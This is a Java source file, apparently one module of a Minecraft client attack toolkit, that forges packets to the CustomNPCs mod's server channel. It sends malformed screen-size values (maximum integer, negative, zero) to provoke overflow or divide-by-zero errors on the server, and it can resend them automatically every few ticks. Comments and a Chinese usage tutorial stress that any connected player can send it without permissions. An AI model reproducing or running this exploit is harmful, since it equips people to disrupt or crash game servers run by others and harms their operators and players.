package com.redblue.red.modules.customnpcs;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * CNPC-07: Screen Size Injection -- inject arbitrary screen size data.
 *
 * Vuln #16 (index 130): SPacketScreenSize
 * Wire: writeInt(width) + writeInt(height)
 *
 * ZERO requirements: toolAllowed returns true always, requiresNpc=false,
 * getPermission=null. Any connected player can send this.
 *
 * Handler: PlayerData.get(player).screenSize.setSize(width, height)
 * Extreme values may cause integer overflow in scripts/GUI that use screenSize.
 */
public class CNPC07_ScreenSize implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("customnpcs", "packets");
    private static final int IDX_SCREEN_SIZE = 130;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofInt("width", "宽度", 1920, -2147483647, 2147483647),
        ConfigParam.ofInt("height", "高度", 1080, -2147483647, 2147483647),
        ConfigParam.ofEnum("preset", "预设", "CUSTOM",
                "CUSTOM", "MAX_INT", "NEGATIVE", "ZERO"),
        ConfigParam.ofInt("interval", "自动间隔(tick)", 20, 1, 200)
    );

    private long lastTick = 0;

    @Override public String id() { return "cnpc07_screen_size"; }
    @Override public String name() { return "屏幕尺寸注入"; }
    @Override public String description() { return "注入异常屏幕尺寸数据(零门槛)"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 选择预设或自定义宽高值\n"
            + "2. 点击执行\n\n"
            + "[预设]\n"
            + "CUSTOM -- 使用自定义宽高值\n"
            + "MAX_INT -- 2147483647 x 2147483647\n"
            + "NEGATIVE -- -1 x -1\n"
            + "ZERO -- 0 x 0 (可能触发除零错误)\n\n"
            + "[零门槛]\n"
            + "无需任何物品、权限或NPC交互。\n"
            + "任何连接到服务器的玩家都可以发送。";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("customnpcs");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;

        String preset = getParam("preset")
                .map(ConfigParam::getString).orElse("CUSTOM");

        int w, h;
        switch (preset) {
            case "MAX_INT" -> { w = Integer.MAX_VALUE; h = Integer.MAX_VALUE; }
            case "NEGATIVE" -> { w = -1; h = -1; }
            case "ZERO" -> { w = 0; h = 0; }
            default -> {
                w = getParam("width").map(ConfigParam::getInt).orElse(1920);
                h = getParam("height").map(ConfigParam::getInt).orElse(1080);
            }
        }

        final int fw = w, fh = h;
        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_SCREEN_SIZE);
            buf.writeInt(fw);
            buf.writeInt(fh);
        });
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        int interval = getParam("interval")
                .map(ConfigParam::getInt).orElse(20);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        execute(mc);
    }
}
